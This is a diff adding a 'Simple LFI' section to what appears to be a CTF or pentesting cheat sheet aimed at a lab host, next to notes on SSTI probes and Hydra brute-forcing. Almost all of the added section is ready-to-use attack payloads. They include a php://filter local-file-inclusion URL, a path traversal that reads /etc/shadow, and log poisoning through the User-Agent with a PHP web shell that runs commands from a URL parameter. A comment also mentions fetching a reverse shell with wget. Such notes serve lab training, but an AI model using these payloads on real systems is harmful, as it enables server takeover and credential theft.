@@ -175,6 +175,29 @@ mget *.txt
 
 {{7*7}} ==> for SSTI/CSTI
 
+## Simple LFI
+
+To read file
+```
+http://host.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+```
+
+Simple traversing
+```
+http://host.thm/test.php?view=../../../etc/shadow
+```
+
+Reverse Shell with User Agent in Burpsuite
+```
+#add this in useragent
+<?php system($_GET['cmd']); ?>
+
+#then in url add
+test.php/?view=access.log$cmd=ls
+
+#wget revshell php and exec
+```
+
 ## Hydra Brute-Forcing
 With known user and unknown password:
 ```bash
